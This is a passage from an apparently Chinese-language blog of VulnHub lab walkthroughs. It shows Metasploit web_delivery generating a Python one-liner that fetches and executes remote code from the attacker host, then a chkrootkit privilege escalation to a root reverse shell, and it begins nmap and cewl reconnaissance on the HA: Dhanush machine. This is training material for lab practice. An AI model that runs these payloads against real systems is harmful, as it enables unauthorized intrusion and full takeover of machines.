<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh ashoka@192.168.142.130</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.142.130 (192.168.142.130)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:cuEf1JsbferQL5tQ/iVC9mGMCIALDE5/sX/OJt5LgPQ.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.142.130<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string">Last login: Tue Nov  5 06:36:00 2019 from 192.168.1.107</span></span><br><span class="line"><span class="string">ashoka@ubuntu:~$ id</span></span><br><span class="line"><span class="string">uid=1001(ashoka) gid=1001(ashoka) groups=1001(ashoka)</span></span><br><span class="line"><span class="string">ashoka@ubuntu:~$ whoami</span></span><br><span class="line"><span class="string">ashoka</span></span><br><span class="line"><span class="string">ashoka@ubuntu:~$ cat /tmp/logs</span></span><br><span class="line"><span class="string">ROOTDIR is `/&#x27;</span></span><br><span class="line">Checking `amd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `basename&#x27;</span>... not infected</span><br><span class="line">Checking `biff<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `chfn&#x27;</span>... not infected</span><br><span class="line">Checking `chsh<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `cron&#x27;</span>... not infected</span><br><span class="line">Checking `crontab<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `date&#x27;</span>... not infected</span><br><span class="line">Checking `du<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `dirname&#x27;</span>... not infected</span><br><span class="line">Checking `<span class="built_in">echo</span><span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `egrep&#x27;</span>... not infected</span><br><span class="line">Checking `env<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `find&#x27;</span>... not infected</span><br><span class="line">Checking `fingerd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `gpm&#x27;</span>... not found</span><br><span class="line">Checking `grep<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `hdparm&#x27;</span>... not infected</span><br><span class="line">Checking `su<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `ifconfig&#x27;</span>... not infected</span><br><span class="line">Checking `inetd<span class="string">&#x27;... not tested</span></span><br><span class="line"><span class="string">Checking `inetdconf&#x27;</span>... not found</span><br><span class="line">Checking `identd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `init&#x27;</span>... not infected</span><br><span class="line">Checking `killall<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `ldsopreload&#x27;</span>... can<span class="string">&#x27;t exec ./strings-static, not tested</span></span><br><span class="line"><span class="string">Checking `login&#x27;</span>... not infected</span><br><span class="line">Checking `ls<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `lsof&#x27;</span>... not infected</span><br><span class="line">Checking `mail<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `mingetty&#x27;</span>... not found</span><br><span class="line">Checking `netstat<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `named&#x27;</span>... not found</span><br><span class="line">Checking `passwd<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `pidof&#x27;</span>... not infected</span><br><span class="line">Checking `pop2<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `pop3&#x27;</span>... not found</span><br><span class="line">Checking `ps<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `pstree&#x27;</span>... not infected</span><br><span class="line">Checking `rpcinfo<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `rlogind&#x27;</span>... not found</span><br><span class="line">Checking `rshd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `slogin&#x27;</span>... not infected</span><br><span class="line">Checking `sendmail<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `sshd&#x27;</span>... not infected</span><br><span class="line">Checking `syslogd<span class="string">&#x27;... not tested</span></span><br><span class="line"><span class="string">Checking `tar&#x27;</span>... not infected</span><br><span class="line">Checking `tcpd<span class="string">&#x27;... INFECTED</span></span><br><span class="line"><span class="string">Checking `tcpdump&#x27;</span>... not infected</span><br><span class="line">Checking `top<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `telnetd&#x27;</span>... not found</span><br><span class="line">Checking `timed<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `traceroute&#x27;</span>... not found</span><br><span class="line">Checking `vdir<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `w&#x27;</span>... not infected</span><br><span class="line">Checking `write<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `aliens&#x27;</span>... no suspect files</span><br><span class="line">Searching <span class="keyword">for</span> sniffer<span class="string">&#x27;s logs, it may take a while... nothing found</span></span><br><span class="line"><span class="string">Searching for HiDrootkit&#x27;</span>s default dir... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> t0rn<span class="string">&#x27;s default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for t0rn&#x27;</span>s v8 defaults... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> Lion Worm default files and <span class="built_in">dirs</span>... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> RSHA<span class="string">&#x27;s default files and dir... nothing found</span></span><br><span class="line"><span class="string">Searching for RH-Sharpe&#x27;</span>s default files... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> Ambient<span class="string">&#x27;s rootkit (ark) default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for suspicious files and dirs, it may take a while... </span></span><br><span class="line"><span class="string">/lib/modules/4.15.0-20-generic/vdso/.build-id</span></span><br><span class="line"><span class="string">/lib/modules/4.15.0-20-generic/vdso/.build-id</span></span><br><span class="line"><span class="string">Searching for LPD Worm files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Ramen Worm files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Maniac files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for RK17 files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Ducoci rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Adore Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for ShitC Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for Omega Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for Sadmind/IIS Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for MonKit... nothing found</span></span><br><span class="line"><span class="string">Searching for Showtee... nothing found</span></span><br><span class="line"><span class="string">Searching for OpticKit... nothing found</span></span><br><span class="line"><span class="string">Searching for T.R.K... nothing found</span></span><br><span class="line"><span class="string">Searching for Mithra... nothing found</span></span><br><span class="line"><span class="string">Searching for LOC rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Romanian rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Suckit rootkit... Warning: /sbin/init INFECTED</span></span><br><span class="line"><span class="string">Searching for Volc rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Gold2 rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for TC2 Worm default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Anonoying rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for ZK rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for ShKit rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for AjaKit rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for zaRwT rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Madalin rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for Fu rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for ESRK rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for rootedoor... nothing found</span></span><br><span class="line"><span class="string">Searching for ENYELKM rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for common ssh-scanners default files... nothing found</span></span><br><span class="line"><span class="string">Searching for suspect PHP files... nothing found</span></span><br><span class="line"><span class="string">Searching for anomalies in shell history files... nothing found</span></span><br><span class="line"><span class="string">Checking `asp&#x27;</span>... not infected</span><br><span class="line">Checking `bindshell<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `lkm&#x27;</span>... not tested: can<span class="string">&#x27;t exec </span></span><br><span class="line"><span class="string">Checking `rexedcs&#x27;</span>... not found</span><br><span class="line">Checking `sniffer<span class="string">&#x27;... not tested: can&#x27;</span>t <span class="built_in">exec</span> ./ifpromisc</span><br><span class="line">Checking `w55808<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `wted&#x27;</span>... not tested: can<span class="string">&#x27;t exec ./chkwtmp</span></span><br><span class="line"><span class="string">Checking `scalper&#x27;</span>... not infected</span><br><span class="line">Checking `slapper<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `z2&#x27;</span>... not tested: can<span class="string">&#x27;t exec ./chklastlog</span></span><br><span class="line"><span class="string">Checking `chkutmp&#x27;</span>... not tested: can<span class="string">&#x27;t exec ./chkutmp</span></span><br><span class="line"><span class="string">Checking `OSX_RSPLUG&#x27;</span>... not infected</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>现在，要在目标计算机上升级特权，将需要在目标计算机上配备一个meterpreter，并在Metasploit的帮助下使用get root。 使用web_delivery漏洞利用meterpreter。 在use命令的帮助下选择了web_delivery利用，然后提供了lhost。 Lhost是目标计算机（Kali Linux）的IP地址。 将输入漏洞利用代码。 这将创建一个单行脚本，该脚本将使我们对目标计算机有一个meterpreter。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"><span class="comment"># cowsay++</span></span><br><span class="line"> ____________                                                                                          </span><br><span class="line">&lt; metasploit &gt;                                                                                         </span><br><span class="line"> ------------                                                                                          </span><br><span class="line">       \   ,__,                                                                                        </span><br><span class="line">        \  (oo)____                                                                                    </span><br><span class="line">           (__)    )\                                                                                  </span><br><span class="line">              ||--|| *                                                                                 </span><br><span class="line">                                                                                                       </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.63-dev                          ]</span><br><span class="line">+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LHOST 192.168.142.128</span><br><span class="line">LHOST =&gt; 192.168.142.128</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.142.128:4444 </span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; [*] Using URL: http://0.0.0.0:8080/iG1jsBgk9ZBOAY</span><br><span class="line">[*] Local IP: http://192.168.142.128:8080/iG1jsBgk9ZBOAY</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">python -c <span class="string">&quot;import sys;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://192.168.142.128:8080/iG1jsBgk9ZBOAY&#x27;);exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure>

<p>复制漏洞利用程序生成的命令，并在之前获得的ssh会话运行python -c “import sys;u=<strong>import</strong>(‘urllib’+{2:’’,3:’.request’}[sys.version_info[0]],fromlist=(‘urlopen’,));r=u.urlopen(‘<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEyODo4MDgwL2lHMWpzQmdrOVpCT0FZJiMzOTspO2V4ZWMoci5yZWFkKCkpOyZxdW90OyVFMyU4MCU4Mg==">http://192.168.142.128:8080/iG1jsBgk9ZBOAY&#39;);exec(r.read());&quot;。<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ashoka@ubuntu:~$ python -c <span class="string">&quot;import sys;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://192.168.142.128:8080/iG1jsBgk9ZBOAY&#x27;);exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure>

<p>这给了需要的session。将使用Metasploit中的内置漏洞利用程序，可以帮助我们在目标计算机上获得root shell。 我们选择了会话并为另一个会话提供了端口。 键入漏洞利用程序后，发现漏洞利用程序正在运行，并且通过前面提到的端口为我们提供了另一个shell为了将shell转换为能够用的shell，运行了python单行代码以生成TTY shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; </span><br><span class="line">[*] 192.168.142.130  web_delivery - Delivering Payload (454) bytes</span><br><span class="line">[*] Sending stage (53755 bytes) to 192.168.142.130</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.142.128:4444 -&gt; 192.168.142.130:38970) at 2019-12-16 01:06:52 -0500</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; </span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; use exploit/unix/<span class="built_in">local</span>/chkrootkit</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; <span class="built_in">set</span> session 3</span><br><span class="line">session =&gt; 3</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; <span class="built_in">set</span> lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.142.128:8888 </span><br><span class="line">[!] Rooting depends on the crontab (this could take a <span class="keyword">while</span>)</span><br><span class="line">[*] Payload written to /tmp/update</span><br><span class="line">[*] Waiting <span class="keyword">for</span> chkrootkit to run via cron...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> XMnVavzOqVIfxgY5;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;XMnVavzOqVIfxgY5\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 4 opened (192.168.142.128:8888 -&gt; 192.168.142.130:44238) at 2019-12-16 01:09:28 -0500</span><br><span class="line">whoami</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> BGwiPjx0EW1uplK3;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;BGwiPjx0EW1uplK3\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 5 opened (192.168.142.128:8888 -&gt; 192.168.142.130:44242) at 2019-12-16 01:10:28 -0500</span><br><span class="line">[!] Tried to delete /tmp/update, unknown result</span><br><span class="line">root</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">final.txt</span><br><span class="line"><span class="comment"># cat final.txt</span></span><br><span class="line">cat final.txt</span><br><span class="line">                                                                   </span><br><span class="line">!! Congrats you have finished this task !!</span><br><span class="line"></span><br><span class="line">Contact us here:</span><br><span class="line"></span><br><span class="line">Hacking Articles : https://twitter.com/rajchandel/</span><br><span class="line">Geet Madan : https://in.linkedin.com/<span class="keyword">in</span>/geet-madan</span><br><span class="line"></span><br><span class="line">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span><br><span class="line"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line">____________________________________</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>找到一个文本文件final.txt，将其打开以查找final flag,挑战到此结束,6的一批。</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[HA-Dhanush]</title>
    <url>/2019/12/17/HA-Dhanush/</url>
    <content><![CDATA[<p>名称：HA：Dhanush<br>发布日期：2019年11月9日</p>
<p>级别：中级<br>任务：枚举目标计算机并获得root用户访问权限。</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQmZPdnJySXFrVmVlRWh2M2o3eUFTS21WTnctODRzM0wvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/1BfOvrrIqkVeeEhv3j7yASKmVNw-84s3L/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9kaGFudXNoLnppcA==">https://download.vulnhub.com/ha/dhanush.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9kaGFudXNoLnppcC50b3JyZW50">https://download.vulnhub.com/ha/dhanush.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>Dhanush曾经是武器技术的巅峰之作。 它把战争重新定义到了一个新的高度，并在历史上的所有神话记载中都提到过。<br>选择你的Dhanush，拉伸琴弦并射击以获取root！枚举是关键！！！！有关印度神话和弓箭的一些信息可能会有所帮助。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.131</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">MAC Address: 00:0C:29:22:66:8B (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.142.131</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /images/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span></span><br><span class="line">| http-fileupload-exploiter: </span><br><span class="line">|   </span><br><span class="line">|     Couldn<span class="string">&#x27;t find a file-type field.</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|_    Couldn&#x27;</span>t find a file-type field.</span><br><span class="line">| http-internal-ip-disclosure: </span><br><span class="line">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.142.131:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.4.29: </span></span><br><span class="line"><span class="string">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span></span><br><span class="line"><span class="string">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span></span><br><span class="line"><span class="string">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span></span><br><span class="line"><span class="string">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span></span><br><span class="line"><span class="string">|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081</span></span><br><span class="line"><span class="string">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span></span><br><span class="line"><span class="string">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span></span><br><span class="line"><span class="string">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span></span><br><span class="line"><span class="string">|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333</span></span><br><span class="line"><span class="string">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span></span><br><span class="line"><span class="string">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span></span><br><span class="line"><span class="string">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span></span><br><span class="line"><span class="string">|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763</span></span><br><span class="line"><span class="string">|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -A 192.168.142.131</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: HA: Dhanush</span><br><span class="line">65345/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e3:2f:3d:dd:ac:42:d4:d5:de:ec:9b:19:0b:45:3e:13 (RSA)</span><br><span class="line">|   256 89:02:8d:a5:e0:75:a5:34:3b:52:3a:6c:d1:f4:05:da (ECDSA)</span><br><span class="line">|_  256 ea:af:62:07:73:d0:d5:1e:fb:a9:12:62:34:27:52:d9 (ED25519)</span><br></pre></td></tr></table></figure>

<p>现在，在进一步之前，此网页可能包含Dhanush的大量信息。 同样，这些可能是用户名或密码。 因此，决定使用cewl命令制作字典。</p>
